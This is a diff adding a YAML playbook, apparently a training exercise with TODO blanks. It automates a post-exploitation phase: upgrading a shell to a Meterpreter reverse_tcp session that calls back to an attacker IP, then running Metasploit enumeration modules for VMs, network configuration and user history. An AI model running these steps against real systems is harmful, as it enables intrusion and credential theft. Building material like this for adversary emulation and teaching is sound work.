@@ -1,0 +1,73 @@
+# Phase 7: Discovery - Meterpreter Upgrade + Post Modules
+#
+# Upgrades a basic shell session (e.g. from vsftpd or distcc) to a full Meterpreter
+# session, then runs post modules for deeper enumeration.
+#
+# Meterpreter gives you: sysinfo, hashdump, download/upload, port forwarding,
+# and access to all post/linux/gather/* modules.
+#
+# Variables required: $LAST_MSF_SESSION, $ATTACKER_IP, $LPORT
+# Variables set:      $SESSION_NAME (updated to point to the Meterpreter session)
+# ATT&CK: T1082, T1057
+
+commands:
+  - type: debug
+    cmd: "Upgrading shell session $LAST_MSF_SESSION to Meterpreter..."
+
+  # TODO: Upgrade the current shell session to Meterpreter.
+  # Module: post/multi/manage/shell_to_meterpreter
+  # SESSION option must reference the existing shell session ($LAST_MSF_SESSION).
+  # Use a separate LPORT for the Meterpreter callback (e.g. 4445) to avoid
+  # conflicting with the original reverse shell port.
+  # Payload: linux/x86/meterpreter/reverse_tcp
+  - type: msf-module
+    cmd: # TODO: fill in the upgrade module path
+    creates_session: meterpreter_session
+    options:
+      SESSION: $LAST_MSF_SESSION
+    payload: # TODO: Meterpreter payload for Linux x86
+    payload_options:
+      LHOST: $ATTACKER_IP
+      LPORT: "4445"
+
+  # Verify the Meterpreter session with sysinfo (requires stdapi: True)
+  - type: msf-session
+    session: meterpreter_session
+    stdapi: true
+    cmd: sysinfo
+    metadata:
+      tactic: "TA0007"
+      technique: "T1082"
+      technique_name: "System Information Discovery"
+
+  # Update SESSION_NAME to the new Meterpreter session
+  - type: setvar
+    variable: SESSION_NAME
+    cmd: meterpreter_session
+
+  # Run post modules for automated enumeration
+  - type: msf-module
+    cmd: post/linux/gather/checkvm
+    options:
+      SESSION: $LAST_MSF_SESSION
+
+  - type: msf-module
+    cmd: post/linux/gather/enum_network
+    options:
+      SESSION: $LAST_MSF_SESSION
+    metadata:
+      tactic: "TA0007"
+      technique: "T1016"
+      technique_name: "System Network Configuration Discovery"
+
+  - type: msf-module
+    cmd: post/linux/gather/enum_users_history
+    options:
+      SESSION: $LAST_MSF_SESSION
+    metadata:
+      tactic: "TA0007"
+      technique: "T1087.001"
+      technique_name: "Account Discovery: Local Account"
+
+  - type: debug
+    cmd: "Meterpreter session ready as $SESSION_NAME"
